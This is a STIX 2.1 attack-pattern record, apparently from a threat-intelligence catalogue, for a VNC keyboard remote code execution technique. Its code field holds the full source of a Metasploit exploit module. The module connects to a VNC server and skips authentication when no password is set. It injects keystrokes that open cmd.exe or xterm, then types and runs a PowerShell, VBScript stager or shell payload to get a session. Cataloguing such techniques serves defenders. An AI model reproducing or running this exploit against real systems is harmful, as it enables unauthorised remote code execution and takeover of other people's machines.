{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--61dea5f3-1ee8-4cb5-97ef-151d3d4ad011",
    "created": "2024-08-14T17:07:04.294878Z",
    "modified": "2024-08-14T17:07:04.294883Z",
    "name": "VNC Keyboard Remote Code Execution",
    "description": " This module exploits VNC servers by sending virtual keyboard keys and executing a payload. On Windows systems a command prompt is opened and a PowerShell or CMDStager payload is typed and executed. On Unix/Linux systems a xterm terminal is opened and a payload is typed and executed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/vnc/vnc_keyboard_exec.rb",
            "external_id": "vnc_keyboard_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.jedi.be/blog/2010/08/29/sending-keystrokes-to-your-virtual-machines-using-X-vnc-rdp-or-native/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'rex/exploitation'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n  WINDOWS_KEY = \"\\xff\\xeb\"\n  ENTER_KEY = \"\\xff\\x0d\"\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'VNC Keyboard Remote Code Execution',\n      'Description'     => %q{\n        This module exploits VNC servers by sending virtual keyboard keys and executing\n        a payload. On Windows systems a command prompt is opened and a PowerShell or CMDStager\n        payload is typed and executed. On Unix/Linux systems a xterm terminal is opened\n        and a payload is typed and executed.\n      },\n      'Author'          => [ 'xistence <xistence[at]0x90.nl>' ],\n      'Privileged'      => false,\n      'License'         => MSF_LICENSE,\n      'Platform'       => %w{ win unix },\n      'Targets'         =>\n        [\n          [ 'VNC Windows / Powershell', { 'Arch' => ARCH_X86, 'Platform' => 'win' } ],\n          [ 'VNC Windows / VBScript CMDStager', { 'Platform' => 'win' } ],\n          [ 'VNC Linux / Unix', { 'Arch' => ARCH_CMD, 'Platform' => 'unix' } ]\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://www.jedi.be/blog/2010/08/29/sending-keystrokes-to-your-virtual-machines-using-X-vnc-rdp-or-native/']\n        ],\n      'DisclosureDate'  => '2015-07-10',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        Opt::RPORT(5900),\n        OptString.new('PASSWORD', [ false, 'The VNC password']),\n        OptInt.new('TIME_KBD_DELAY', [ true, 'Delay in milliseconds when typing long commands (0 to disable)', 50]),\n        OptInt.new('TIME_KBD_THRESHOLD', [ true, 'How many keystrokes between each delay in long commands', 50]),\n        OptInt.new('TIME_WAIT', [ true, 'Time to wait for payload to be executed', 20])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def press_key(key)\n    keyboard_key = \"\\x04\\x01\" # Press key\n    keyboard_key << \"\\x00\\x00\\x00\\x00\" # Unknown / Unused data\n    keyboard_key << key # The keyboard key\n    # Press the keyboard key. Note: No receive is done as everything is sent in one long data stream\n    sock.put(keyboard_key)\n  end\n\n\n  def release_key(key)\n    keyboard_key = \"\\x04\\x00\" # Release key\n    keyboard_key << \"\\x00\\x00\\x00\\x00\" # Unknown / Unused data\n    keyboard_key << key # The keyboard key\n    # Release the keyboard key. Note: No receive is done as everything is sent in one long data stream\n    sock.put(keyboard_key)\n  end\n\n\n  def exec_command(command)\n    # Timing configuration: Typing a long command too fast may overload the tagret's keyboard buffer\n    delay_duration = datastore['TIME_KBD_DELAY']\n    delay_treshold = datastore['TIME_KBD_THRESHOLD']\n    delay_treshold = 0 if delay_treshold < 0 or delay_duration <= 0\n    delay_duration = delay_duration.to_f / 1000\n    # Break down command into a sequence of keypresses\n    values = command.chars.to_a\n    values.each_with_index do |value, index|\n      press_key(\"\\x00#{value}\")\n      release_key(\"\\x00#{value}\")\n      sleep(delay_duration) if delay_treshold > 0 and index % delay_treshold == 0\n    end\n    press_key(ENTER_KEY)\n  end\n\n\n  def start_cmd_prompt\n    print_status(\"#{rhost}:#{rport} - Opening Run command\")\n    # Pressing and holding windows key for 1 second\n    press_key(WINDOWS_KEY)\n    Rex.select(nil, nil, nil, 1)\n    # Press the \"r\" key\n    press_key(\"\\x00r\")\n    # Now we can release both keys again\n    release_key(\"\\x00r\")\n    release_key(WINDOWS_KEY)\n    # Wait a second to open run command window\n    select(nil, nil, nil, 1)\n    exec_command('cmd.exe')\n    # Wait a second for cmd.exe prompt to open\n    Rex.select(nil, nil, nil, 1)\n  end\n\n\n  def exploit\n\n    begin\n      alt_key = \"\\xff\\xe9\"\n      f2_key = \"\\xff\\xbf\"\n      password = datastore['PASSWORD']\n\n      connect\n      vnc = Rex::Proto::RFB::Client.new(sock, :allow_none => false)\n\n      unless vnc.handshake\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - VNC Handshake failed: #{vnc.error}\")\n      end\n\n      if password.nil?\n        print_status(\"#{rhost}:#{rport} - Bypass authentication\")\n        # The following byte is sent in case the VNC server end doesn't require authentication (empty password)\n        sock.put(\"\\x10\")\n      else\n        print_status(\"#{rhost}:#{rport} - Trying to authenticate against VNC server\")\n        if vnc.authenticate(password)\n          print_status(\"#{rhost}:#{rport} - Authenticated\")\n        else\n          fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - VNC Authentication failed: #{vnc.error}\")\n        end\n      end\n\n      # Send shared desktop\n      unless vnc.send_client_init\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - VNC client init failed: #{vnc.error}\")\n      end\n\n      if target.name =~ /VBScript CMDStager/\n        start_cmd_prompt\n        print_status(\"#{rhost}:#{rport} - Typing and executing payload\")\n        execute_cmdstager({:flavor => :vbs, :linemax => 8100})\n        # Exit the CMD prompt\n        exec_command('exit')\n      elsif target.name =~ /Powershell/\n        start_cmd_prompt\n        print_status(\"#{rhost}:#{rport} - Typing and executing payload\")\n        command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encode_final_payload: true})\n        # Execute powershell payload and make sure we exit our CMD prompt\n        exec_command(\"#{command} && exit\")\n      elsif target.name =~ /Linux/\n        print_status(\"#{rhost}:#{rport} - Opening 'Run Application'\")\n        # Press the ALT key and hold it for a second\n        press_key(alt_key)\n        Rex.select(nil, nil, nil, 1)\n        # Press F2 to start up \"Run application\"\n        press_key(f2_key)\n        # Release ALT + F2\n        release_key(alt_key)\n        release_key(f2_key)\n        # Wait a second for \"Run application\" to start\n        Rex.select(nil, nil, nil, 1)\n        # Start a xterm window\n        print_status(\"#{rhost}:#{rport} - Opening xterm\")\n        exec_command('xterm')\n        # Wait a second for \"xterm\" to start\n        Rex.select(nil, nil, nil, 1)\n        # Execute our payload and exit (close) the xterm window\n        print_status(\"#{rhost}:#{rport} - Typing and executing payload\")\n        exec_command(\"nohup #{payload.encoded} &\")\n        exec_command('exit')\n      end\n\n      print_status(\"#{rhost}:#{rport} - Waiting for session...\")\n      (datastore['TIME_WAIT']).times do\n        Rex.sleep(1)\n\n        # Success! session is here!\n        break if session_created?\n      end\n\n    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout => e\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - #{e.message}\")\n    ensure\n      disconnect\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    exec_command(cmd)\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2015-07-10",
    "x_mitre_platforms": [
        "%w{ win unix }"
    ]
}